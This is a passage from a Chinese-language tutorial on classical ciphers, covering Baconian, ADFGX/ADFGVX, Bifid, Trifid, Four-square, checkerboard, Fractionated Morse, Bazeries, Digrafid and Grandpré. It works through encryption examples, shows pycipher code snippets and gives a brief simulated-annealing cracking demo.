<p>以E(x) = (5x + 8) mod 26加密，通过计算可得D(x)=21(x - 8) mod 26，这样便可以得到明文。</p>
<p>可参考的Python脚本</p>
<p><img src="https://www.hackfun.org/usr/uploads/2016/07/488561424.png" alt="仿射密码解密脚本.png"></p>
<p>加解密<a href="http://www.practicalcryptography.com/ciphers/classical-era/affine/" target="_blank" rel="noopener">传送门</a></p>
<hr>
<h4><span id="17培根密码">17.培根密码</span></h4><p><strong>（1）介绍</strong></p>
<p>培根密码(Baconian Cipher)是一种替换密码，每个明文字母被一个由5字符组成的序列替换，最初的加密方式就是由’A’和’B’组成序列替换明文(所以你当然也可以用别的字母)，比如字母’D’替换成”aaabb”，以下是全部的对应关系(另一种对于关系是每个字母都有唯一对应序列，I和J与U/V各自都有不同对应序列)：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">A = aaaaa  I/J = abaaa  R = baaaa</span><br><span class="line"> </span><br><span class="line">B = aaaab  K = abaab    S = baaab</span><br><span class="line"> </span><br><span class="line">C = aaaba  L = ababa    T = baaba</span><br><span class="line"> </span><br><span class="line">D = aaabb  M = ababb    U/V = baabb</span><br><span class="line"> </span><br><span class="line">E = aabaa  N = abbaa    W = babaa</span><br><span class="line"> </span><br><span class="line">F = aabab  O = abbab    X = babab</span><br><span class="line"> </span><br><span class="line">G = aabba  P = abbba    Y = babba</span><br><span class="line"> </span><br><span class="line">H = aabbb  Q = abbbb    Z = babbb</span><br></pre></td></tr></table></figure>
<p>明文：<code>T H E F O X</code></p>
<p>密文：<code>baaba aabbb aabaa aabab abbab babab</code></p>
<p>加解密<a href="http://rumkin.com/tools/cipher/baconian.php" target="_blank" rel="noopener">传送门</a></p>
<hr>
<h4><span id="18adfgx和adfgvx密码">18.ADFGX和ADFGVX密码</span></h4><p><strong>（1）ADFGX密码</strong></p>
<p>ADFGX密码(ADFGX Cipher)是结合了改良过的Polybius方格替代密码与单行换位密码的矩阵加密密码，使用了5个合理的密文字母：A，D，F，G，X，这些字母之所以这样选择是因为当转译成摩尔斯电码(ADFGX密码是德国军队在一战发明使用的密码)不易混淆，目的是尽可能减少转译过程的操作错误。</p>
<p>加密矩阵示例：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">    A  D  F  G   X</span><br><span class="line">  ----------------</span><br><span class="line">A | p  h  q  g   m </span><br><span class="line">D | e  a  y  n   o </span><br><span class="line">F | f  d  x  k   r</span><br><span class="line">G | c  v  s  z   w </span><br><span class="line">X | b  u  t  i/j l</span><br></pre></td></tr></table></figure>
<p>明文：<code>THE QUICK BROWN FOX</code></p>
<p>结果矩阵加密：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">XF AD DA   AF XD XG GA FG   XA FX DX GX DG   FA DX FF</span><br></pre></td></tr></table></figure>
<p>列移位密钥：<code>how are u</code></p>
<p><img src="https://www.hackfun.org/usr/uploads/2016/07/3686106504.png" alt="ADFGX密码.png"></p>
<p>密文：<code>DXADF AGXF XFFXD FXGGX DGFG AADA ADXXF</code></p>
<p>已知密钥加解密：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt;from pycipher import ADFGX</span><br><span class="line">&gt;&gt;&gt;a = ADFGX(&apos;phqgmeaynofdxkrcvszwbutil&apos;,&apos;HOWAREU&apos;)</span><br><span class="line">&gt;&gt;&gt;a.encipher(&apos;THE QUICK BROWN FOX&apos;)</span><br><span class="line">&apos;DXADFAGXFXFFXDFXGGXDGFGAADAADXXF&apos;</span><br><span class="line">&gt;&gt;&gt;a.decipher(&apos;DXADFAGXFXFFXDFXGGXDGFGAADAADXXF&apos;)</span><br><span class="line">&apos;THEQUICKBROWNFOX&apos;</span><br></pre></td></tr></table></figure>
<p>在线加解密<a href="http://www.practicalcryptography.com/ciphers/adfgx-cipher/" target="_blank" rel="noopener">传送门</a></p>
<p><strong>（2）ADFGVX密码</strong></p>
<p>ADFGVX密码实际上就是ADFGX密码的扩充升级版，一样具有ADFGX密码相同的特点，加密过程也类似，不同的是密文字母增加了V，使得可以再使用10数字来替换明文。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">    A D F G V X</span><br><span class="line">  -------------</span><br><span class="line">A | p h 0 q g 6</span><br><span class="line">D | 4 m e a 1 y</span><br><span class="line">F | l 2 n o f d</span><br><span class="line">G | x k r 3 c v</span><br><span class="line">V | s 5 z w 7 b</span><br><span class="line">X | j 9 u t i 8</span><br></pre></td></tr></table></figure>
<p>由于两种加密过程完全类似这里就不再重复给出加密过程。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt;from pycipher import ADFGVX</span><br><span class="line">&gt;&gt;&gt;a = ADFGVX(&apos;ph0qg64mea1yl2nofdxkr3cvs5zw7bj9uti8&apos;,&apos;HOWAREU&apos;)</span><br><span class="line">&gt;&gt;&gt;a.encipher(&apos;THE QUICK BROWN FOX&apos;)</span><br><span class="line">&apos;DXXFAFGFFXGGGFGXDVGDVGFAVFVAFVGG&apos;</span><br><span class="line">&gt;&gt;&gt;a.decipher(&apos;DXXFAFGFFXGGGFGXDVGDVGFAVFVAFVGG&apos;)</span><br><span class="line">&apos;THEQUICKBROWNFOX&apos;</span><br></pre></td></tr></table></figure>
<hr>
<h4><span id="19双密码">19.双密码</span></h4><p><strong>（1）双密码</strong></p>
<p>双密码(Bifid Cipher)结合了波利比奥斯方阵换位密码，并采用分级实现扩散，这里的“双”是指用2个密钥进行加密。双密码是由法国Felix Delastelle发明，除此之外Felix Delastelle还发明了三分密码(Trifid Cipher)，四方密码(Four-Square Cipher)。还有一个<a href="https://en.wikipedia.org/wiki/Two-square_cipher" target="_blank" rel="noopener">两方密码</a>(Two-Square)与四方密码类似，<a href="http://www.thonky.com/kryptos/cm-bifid-cipher" target="_blank" rel="noopener">共轭矩阵双密码</a>(Conjugated Matrix Bifid Cipher)也是双密码的变种。</p>
<p>示例密阵:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">   1 2 3 4 5</span><br><span class="line">1| p h q g m</span><br><span class="line">2| e a y l n</span><br><span class="line">3| o f d x k</span><br><span class="line">4| r c v s z</span><br><span class="line">5| w b u t i/j</span><br></pre></td></tr></table></figure>
<p>明文:<code>THE QUICK BROWN FOX</code></p>
<p>经过密阵转换：</p>
<p>行:<code>512 15543 54352 333</code></p>
<p>列:<code>421 33525 21115 214</code></p>
<p>分组:</p>
<p><code>51215 54354 35233 3</code></p>
<p><code>42133 52521 11521 4</code></p>
<p>合并：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">5121542133 5435452521 3523311521 34</span><br></pre></td></tr></table></figure>
<p>在经过密阵转换后密文:<code>WETED TKZNE KYOME X</code></p>
<p><strong>（2）已知密阵加解密</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt;from pycipher import</span><br><span class="line">&gt;&gt;&gt;Bifid(&apos;phqgmeaylnofdxkrcvszwbuti&apos;,5).encipher(&apos;THE QUICK BROWN FOX&apos;)</span><br><span class="line">&apos;WETEDTKZNEKYOMEX&apos;</span><br><span class="line">&gt;&gt;&gt;Bifid(&apos;phqgmeaylnofdxkrcvszwbuti&apos;,5).decipher(&apos;WETEDTKZNEKYOMEX&apos;)</span><br><span class="line">&apos;THEQUICKBROWNFOX&apos;</span><br></pre></td></tr></table></figure>
<p>在线加解密<a href="http://www.practicalcryptography.com/ciphers/classical-era/bifid/" target="_blank" rel="noopener">传送门</a></p>
<p><strong>（3）未知密阵破解</strong></p>
<p>手工分析破解双密码是有一定难度的，每个字母都是同过3个数字进行非线性代替转换，而且之后还会对字母顺序进行打乱，这样使双密码比一些替换密码和换位密码更难破解。然而，现在是计算机时代，这张加密方式没有安全性可言，通过<a href="http://baike.baidu.com/link?url=mkceUr0W4L7B7UVQxc-dUkXKPJbj9v4YyBh_hrskt5iXk99UdnjW6mZ_YxoJO1PkT1zdjEZD2hd7TCMiSxpOma" target="_blank" rel="noopener">模拟退火</a>算法就能快速找到双密码的密阵。</p>
<p>这里推荐一篇详细的<a href="http://www.practicalcryptography.com/cryptanalysis/stochastic-searching/cryptanalysis-bifid-cipher/" target="_blank" rel="noopener">双密码破解分析</a>的文章，基于模拟退火算法实现的工具破解示例：</p>
<p>密文:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">KWTAZQLAWWZCPONIVBTTBVQUZUGRNHAYIYGIAAYURCUQLDFTYVHTNQEENUPAIFCUNQTNGITEFUSHFDWHRIFSVTBISYDHHASQSROMUEVPQHHCCRBYTQBHWYRRHTEPEKHOBFSZUQBTSYRSQUDCSAOVUUGXOAUYWHPGAYHDNKEZPFKKWRIEHDWPEIOTBKESYETPBPOGTHQSPUMDOVUEQAUPCPFCQHRPHSOPQRSSLPEVWNIQDIOTSQESDHURIEREN</span><br></pre></td></tr></table></figure>
<p>解密：</p>
<p><img src="https://www.hackfun.org/usr/uploads/2016/07/4255378402.png" alt="双密码解密.png"></p>
<p>得到加密矩阵:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">G B C M K</span><br><span class="line">D H U E T</span><br><span class="line">L V Y W I</span><br><span class="line">X O Z S P</span><br><span class="line">N F A R Q</span><br></pre></td></tr></table></figure>
<p>明文:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">CRYPTANALYS IS OF BIFID BY HAND IS ACTUALLY FAIRLY DIFFICULT THE FRACTIONATING NATURE OF THE CIPHER IE EACH LETTER IS SUBSTITUTED BY CHARACTERS THEN THESE CHARACTERS ARE IUM BLED WHICH WILL PULL THEM APART MAKES THE CIPHER MUCH STRONGER THAN SUBSTITUTION CIPHERS OR TRANSPOSITION CIPHER SON THEIR OWN</span><br></pre></td></tr></table></figure>
<hr>
<h4><span id="20三分密码">20.三分密码</span></h4><p>三分密码(Trifid Cipher)结合换位和替换，三分密码与双密码非常相似，差别之处就是用除了3×3×3的密阵代替5×5密阵。</p>
<p>示例密阵:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">密阵顺序 = EPSDUCVWYM.ZLKXNBTFGORIJHAQ      </span><br><span class="line">                          </span><br><span class="line">方阵 1      方阵 2      方阵 3                                     </span><br><span class="line">  1 2 3      1 2 3      1 2 3    </span><br><span class="line">1 E P S    1 M . Z    1 F G O    </span><br><span class="line">2 D U C    2 L K X    2 R I J    </span><br><span class="line">3 V W Y    3 N B T    3 H A Q</span><br></pre></td></tr></table></figure>
<p>明文:<code>THE QUICK BROWN FOX.</code></p>
<p>经过密阵转换：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">T H E Q U I C K B R O W N F O X .</span><br><span class="line">2 3 1 3 1 3 1 2 2 3 3 1 2 3 3 2 2</span><br><span class="line">3 3 1 3 2 2 2 2 3 2 1 3 3 1 1 2 1</span><br><span class="line">3 1 1 3 2 2 3 2 2 1 3 2 1 1 3 3 2</span><br></pre></td></tr></table></figure>
<p>T(233)表示T在第一个方阵第三行第三列的位置</p>
<p>分组(分组密钥以5为例):</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">THEQU ICKBR OWNFO X.</span><br><span class="line">23131 31223 31233 22</span><br><span class="line">33132 22232 13311 21</span><br><span class="line">31132 23221 32113 32</span><br></pre></td></tr></table></figure>
<p>合并：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">23131 33132 31132 31223 22232 23221 31233 13311 32113 22 21 32</span><br></pre></td></tr></table></figure>
<p>在经过密阵转换后密文:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">231313313231132312232223223221312331331132113222132</span><br><span class="line">N  O  O  N  W  G  B  X  X  L  G  H  H  W  S  K  W</span><br></pre></td></tr></table></figure>
<p>想要深入了解三分密码并破解三分密码的小伙伴推荐去看LANIKI教授的一篇密码课程章节的<a href="http://www.und.nodak.edu/org/crypto/crypto/lanaki.crypt.class/lessons/lesson17.zip" target="_blank" rel="noopener">讲义</a>。</p>
<hr>
<h4><span id="21四方密码">21.四方密码</span></h4><p><strong>（1）介绍</strong></p>
<p>四方密码(Four-Square Cipher)是类似普莱菲尔密码双字母加密密码，这样使加密效果强于其他替换密码，因为频率分析变得更加困难了。</p>
<p>四方密码使用4个预先设置的5×5字母矩阵，每个矩阵包括25个字母，通常字母’j’被融入到’i’中(维基百科上说’q’被忽略，不过这不重要，因为’q’和’j’都是很少出现的字母)，通常左上和右下矩阵式是标准字母排序明文矩阵，右上和左下矩阵是打乱顺序的密钥矩阵。</p>
<p>示例矩阵：</p>
<p>![四方密码.png][47]</p>
<p>明文：<code>THE QUICK BROWN FOX JUMPS OVER THE LAZY DOG</code></p>
<p>整理明文(分组不够时用’X’填充)：<code>TH EQ UI CK BR OW NF OX JU MP SO VE RT HE LA ZY DO GX</code></p>
<p>加密过程：分别在明文矩阵中找到’TH’，分别找到他们在右上矩阵有左下矩阵的交点字母’ES’就是密文，以此类推。</p>
<p>密文：<code>ESZWQAFHGTDKWHRKUENYQOLMQTUNWMBPTGHQ</code></p>
<p><strong>（2）已知密钥矩阵加解密</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt;from pycipher import Foursquare</span><br><span class="line">&gt;&gt;&gt;fs = Foursquare(&apos;zgptfoihmuwdrcnykeqaxvsbl&apos;,&apos;mfnbdcrhsaxyogvituewlqzkp&apos;)</span><br><span class="line">&gt;&gt;&gt;fs.encipher(&apos;THE QUICK BROWN FOX JUMPS OVER THE LAZY DOG&apos;)</span><br><span class="line">&apos;ESZWQAFHGTDKWHRKUENYQOLMQTUNWMBPTGHQ&apos;</span><br><span class="line">&gt;&gt;&gt;fs.decipher(&apos;ESZWQAFHGTDKWHRKUENYQOLMQTUNWMBPTGHQ&apos;)</span><br><span class="line">&apos;THEQUICKBROWNFOXJUMPSOVERTHELAZYDOG&apos;</span><br></pre></td></tr></table></figure>
<p>在线加解密<a href="http://www.practicalcryptography.com/ciphers/classical-era/four-square/" target="_blank" rel="noopener">传送门</a></p>
<p><strong>（3）未知密钥矩阵破解</strong></p>
<p>推荐一篇关于采用<a href="http://blog.csdn.net/xianlingmao/article/details/7798647" target="_blank" rel="noopener">模拟退火算法</a>的<a href="http://www.practicalcryptography.com/cryptanalysis/stochastic-searching/cryptanalysis-foursquare-cipher/" target="_blank" rel="noopener">四方密码分析</a>文章，如果有足够多的密文那么四方密码可以轻易被破解，如果知道了明文和密文推出密钥是很容易的，猜测部分明文是一个有效的方法去破解四方密码，如果一部分明文已知或者可以被猜测出</p>
<p>那么我们首先要确定尽可能多可利用的密钥，然后才可以进行更多的推测或者用其他的方法破译。基于四方密码分析一文实现的<a href="http://www.practicalcryptography.com/cryptanalysis/stochastic-searching/cryptanalysis-foursquare-cipher/" target="_blank" rel="noopener">C代码</a>破解示例：</p>
<p>密文(密文最好在200个字符以上)：</p>
<p>HMMKEQESDTMDHLAWFWMNKSOSFOMRFNLWLKHNSQGGEKXEOLLVDXNRSQQGARTFKSAVNUDLFNDHESPZGQ</p>
<p>TWESAGPGSQSQSTPKUSBBQLQHESAGPGSQSQGXLNAVHTPMHMKKNYGSUGDMTPDGFNKYAVHXLWGEKRILESLZ</p>
<p>ZOFNAVIHRHRKAGHSMYUGEGNSRGAVMVOQPRLNKRXLMYLQPXILESQYBNRHRKAGKYQXDIHMPGPYOERZOLBEZ</p>
<p>LURFWLWUOLDDPNSQYAGMUQPQWESBEZVEQESDTMDBQLWDIUSHB</p>
<p>用法：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gcc -O3 -lm foursquarecrack2.c scoreText_2.c -o fsc</span><br><span class="line">./fsc</span><br></pre></td></tr></table></figure>
<p>输出结果：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Running foursquarecrack, this could take a few minutes... </span><br><span class="line">best score so far: -1239.505249, on iteration 1</span><br><span class="line">Key: &apos;KFMLUGWSQEPOZTNRBHDAVXCIY&apos;,&apos;UGSVKFIZMOYXPQRWTHLNCABED&apos;     </span><br><span class="line">plaintext: &apos;THECIPHERTEXTSQUARESCANBEGENERATEDUSINGAKEYWORDDROPPINGDUPLICAT</span><br><span class="line">            ELETTERSTHENFILLTHEREMAININGSPACESWITHTHEREMAININGLETTERSOFTHEA</span><br><span class="line">            LPHABETINORDERALTERNATIVELYTHECIPHERTEXTSQUARESCANBEGENERATEDCO</span><br><span class="line">            MPLETELYRANDOMLYTHEFOURSQUAREALGORITHMALLOWSFORTWOSEPARATEKEYSO</span><br><span class="line">            NEFOREACHOFTHETWOCIPHERTEXTMATRICESX&apos;</span><br></pre></td></tr></table></figure>
<hr>
<h4><span id="22棋盘密码">22.棋盘密码</span></h4><p>棋盘密码（Checkerboard Cipher)是使用一个波利比奥斯方阵和两个密钥作为密阵的替换密码，通常在波利比奥斯方阵中J字母往往被包含在I字母中。</p>
<p>示例密阵：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">   Q  U  I  C  K</span><br><span class="line">  --------------</span><br><span class="line">B |K  N I/J G  H</span><br><span class="line">R |P  Q  R  S  T</span><br><span class="line">O |O  Y  Z  U  A</span><br><span class="line">W |M  X  W  V  B</span><br><span class="line">N |L  F  E  D  C</span><br></pre></td></tr></table></figure>
<p>经过密阵替换:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">明文:T  H  E  Q  U  I  C  K  B  R  O  W  N  F  O  X</span><br><span class="line">密文:RK BK RU OC OC BI NK BQ WK RI OQ WI BU NU OQ WU</span><br></pre></td></tr></table></figure>
<hr>
<h4><span id="23跨棋盘密码">23.跨棋盘密码</span></h4><p>跨棋盘密码(Straddle Checkerboard Cipher)是一种替换密码，当这种密码在结合其他加密方式，加密效果会更好。</p>
<p>棋盘示例(选择3和7作为变换):</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">   0 1 2 3 4 5 6 7 8 9</span><br><span class="line">   f k m   c p d   y e</span><br><span class="line">3: h b i g q r o s a z</span><br><span class="line">7: l u t j n w v x</span><br></pre></td></tr></table></figure>
<p>明文: <code>T H E Q U I C K B R O W N F O X</code></p>
<p>经过加密棋盘替换得到密文:<code>72 30 9 34 71 32 4 1 31 35 36 75 74 0 36 77</code></p>
<p>当然我们还可以继续用其他的加密方式在对跨棋盘密码加密出的结果再进行加密:</p>
<p>示例变换密钥:83729</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">8372983729837298372983729837</span><br><span class="line">+7230934713241313536757403677</span><br><span class="line">-----------------------------</span><br><span class="line"> 5502817432078501808630122404</span><br></pre></td></tr></table></figure>
<p>在经过棋盘转换后:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">5502817432078501808630122404</span><br><span class="line">ppfmyk n if  pfkyfyd hkmmcfc</span><br></pre></td></tr></table></figure>
<p>最终得到密文: ppfmyk n if  pfkyfyd hkmmcfc</p>
<p>在线加解密<a href="http://www.practicalcryptography.com/ciphers/classical-era/straddle-checkerboard/" target="_blank" rel="noopener">传送门</a></p>
<hr>
<h4><span id="24分组摩尔斯替换密码">24.分组摩尔斯替换密码</span></h4><p>分组摩尔斯替换密码(Fractionated Morse Cipher)首先把明文转换为莫尔斯电码，不过每个字母之间用<code>x</code>分开，每个单词用<code>xx</code>分开。然后使用密钥生成一个替换密表，这个密表包含所有<code>. - x</code>组合的情况(因为不会出现<code>xxx</code>的情况，所以一共26种组合)。</p>
<p>密钥:<code>MORSECODE</code></p>
<p>密表:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">MORSECDABFGHIJKLNPQTUVWXYZ</span><br><span class="line">.........---------XXXXXXXX</span><br><span class="line">...---XXX...---XXX...---XX</span><br><span class="line">.-X.-X.-X.-X.-X.-X.-X.-X.-</span><br></pre></td></tr></table></figure>
<p>说明:密表下半部分是固定的，密表的安全性以及加密效果主要取决于使用的密钥。</p>
<p>明文：<code>THE QUICK BROWN FOX JUMPS OVER THE LAZY DOG</code></p>
<p>(类似)摩尔斯电码:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-x....x.xx--.-x..-x..x-.-.x-.-xx-...x.-.x---x.--x-.xx..-.x---x-..-xx.---x..- --x.--.x...xx---x...-x.x.-.xx-x....x.xx.-..x.-x--..x-.--xx-..x---x--.</span><br></pre></td></tr></table></figure>
<p>说明:明文在转换为(类似)摩尔斯电码后进行每3个字符分组，再进行密表的查表。</p>
<p>密文(经过密表替换):<code>LMUWC OQVHG ZMTAK EVYSW NOYJQ NLIQB JQCDH XMDYF TWRGP FWNH</code></p>
<p>已知密钥在线加解密<a href="http://ruffnekk.stormloader.com/fractmorse_tool.html" target="_blank" rel="noopener">传送门</a></p>
<hr>
<h4><span id="25bazeries密码">25.Bazeries密码</span></h4><p>Bazeries密码(Bazeries Cipher)是换位密码和替换密码的组合，使用两个波利比奥斯方阵，一个明文字母方阵，使用一个随机的数字(一般小于1000000)的生成一个密钥矩阵同时作为第一轮明文划分分组，比如2333这个数字翻译为英文便是TWO THOUSAND THREE HUNDRED THIRTY THREE,从第一个字母T开始选取不重复的字母，之后再从字母表中按序选取没有出现的字母组成密钥矩阵。</p>
<p>明文:<code>THE QUICK BROWN FOX JUMPS OVER THE LAZY DOG</code></p>
<p>随机数字:<code>2333</code></p>
<p>明文矩阵:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">A  F  L  Q  V</span><br><span class="line">B  G  M  R  W</span><br><span class="line">C  H  N  S  X</span><br><span class="line">D I/J O  T  Y</span><br><span class="line">E  K  P  U  Z</span><br></pre></td></tr></table></figure>
<p>示例密钥矩阵:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">T  W  O  H  U</span><br><span class="line">S  A  N  D  R</span><br><span class="line">E I/J Y  B  C</span><br><span class="line">F  G  K  L  M</span><br><span class="line">P  Q  V  X  Z</span><br></pre></td></tr></table></figure>
<p>明文分组:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">2   3   3   3   2   3   3   3  2   3   3  3</span><br><span class="line">TH EQU ICK BRO WN FOX JUM PSO VE RTH ELA ZYD OG</span><br></pre></td></tr></table></figure>
<p>分组明文反序:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">HT UQE KCI ORB WN XOF MUJ OSP EV EHT ALE DYZ GO</span><br></pre></td></tr></table></figure>
<p>使用密钥矩阵替换:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">IL XHP QEG KDS YR CKW NXG KBV PU ILD TOP FMZ AK</span><br></pre></td></tr></table></figure>
<p>(比如’H’在明文矩阵对应到密钥矩阵的位置就是’I’）</p>
<p>已知密钥在线加解密<a href="http://ruffnekk.stormloader.com/bazeries_tool.html" target="_blank" rel="noopener">传送门</a></p>
<hr>
<h4><span id="26digrafid密码">26.Digrafid密码</span></h4><p>Digrafid密码(Digrafid Cipher)使用两个密钥生成分别生成类似波利比奥斯方阵的3x9方格的密表。，主要有3分组和4分组两类。</p>
<p>第一个方阵密钥:<code>digrafid</code></p>
<p>第二个方阵密钥:<code>cipher</code></p>
<p>密表：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">1 2 3 4 5 6 7 8 9</span><br><span class="line">D I G R A F D B C 1 2 3</span><br><span class="line">E H J L M N O P Q 4 5 6</span><br><span class="line">S T U V W X Y Z # 7 8 9</span><br><span class="line">                  c f s 1</span><br><span class="line">                  i g t 2</span><br><span class="line">                  p j u 3</span><br><span class="line">                  h k v 4</span><br><span class="line">                  e l w 5</span><br><span class="line">                  r m x 6</span><br><span class="line">                  a n y 7</span><br><span class="line">                  b o z 8</span><br><span class="line">                  d q # 9</span><br></pre></td></tr></table></figure>
<p>明文:<code>THE QUICK BROWN FOX</code></p>
<p>密表转换(以4分组为例):</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Th Eq Ui Ck   Br Ow Nf Ox</span><br><span class="line">2  1  3  9    8  7  6  7</span><br><span class="line">7  5  7  2    1  6  5  6</span><br><span class="line">4  9  2  4    6  5  1  6</span><br></pre></td></tr></table></figure>
<p>说明:T在第一矩阵第2列，h在第二矩阵第4行，T所在的行与h所在的列相交的位置数字为7，所以Th表示为274。</p>
<p>转换密文:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">213 975 724 924   876 716 566 516</span><br><span class="line">Ip  #e  Dk  Ck    Zr  Dr  Mx  Ar</span><br></pre></td></tr></table></figure>
<hr>
<p>####27.格朗普雷密码####</p>
<p>格朗普雷密码(Grandpré Cipher)是替换密码的一种，一般使用8个8字母的单词横向填充8x8方阵，且第一列为一个单词，并且在方阵中26个字母都必须出现一次以上。</p>
<p>示例密阵:</p>
<p>![格朗普雷密码.jpg][48]</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">明文:T  H  E  Q  U  I  C  K  B  R  O  W  N  F  O </span><br><span class="line">密文:84 27 82 41 51 66 31 36 15 71 67 73 52 34 67</span><br></pre></td></tr></table></figure>
<p>说明：明文中的字母在密阵位置可能不止一个，所以加密结果可能有多种，但是不影响解密。密阵还有6x6，7x7，9x9,10x10几种。显然密阵越大每个字母被替换的情况就可能越多，那么加密效果就更好。</p>
<hr>
